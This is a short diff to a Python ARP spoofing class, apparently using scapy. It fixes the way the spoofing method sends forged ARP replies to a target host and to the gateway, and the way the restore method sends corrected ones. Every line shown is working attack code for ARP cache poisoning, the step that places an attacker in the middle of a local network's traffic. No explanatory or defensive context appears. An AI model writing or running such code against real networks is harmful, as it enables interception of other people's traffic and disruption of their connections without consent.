@@ -60,28 +60,32 @@ class ARPSpoofer(object):
 
     def _send_spoofed_packets(self, host):
         send(
-            ARP(op=2, psrc=host.ip, pdst=self.gateway_ip, hwdst=self.gateway_mac),
-            ARP(op=2, psrc=self.gateway_ip, pdst=host.ip, hwdst=host.mac),
+            [
+                ARP(op=2, psrc=host.ip, pdst=self.gateway_ip, hwdst=self.gateway_mac),
+                ARP(op=2, psrc=self.gateway_ip, pdst=host.ip, hwdst=host.mac),
+            ],
             verbose=0,
             iface=self.interface,
         )
 
     def _restore(self, host):
         send(
-            ARP(
-                op=2,
-                psrc=host.ip,
-                hwsrc=host.mac,
-                pdst=self.gateway_ip,
-                hwdst=BROADCAST,
-            ),
-            ARP(
-                op=2,
-                psrc=self.gateway_ip,
-                hwsrc=self.gateway_mac,
-                pdst=host.ip,
-                hwdst=BROADCAST,
-            ),
+            [
+                ARP(
+                    op=2,
+                    psrc=host.ip,
+                    hwsrc=host.mac,
+                    pdst=self.gateway_ip,
+                    hwdst=BROADCAST,
+                ),
+                ARP(
+                    op=2,
+                    psrc=self.gateway_ip,
+                    hwsrc=self.gateway_mac,
+                    pdst=host.ip,
+                    hwdst=BROADCAST,
+                ),
+            ],
             verbose=0,
             iface=self.interface,
             count=3,
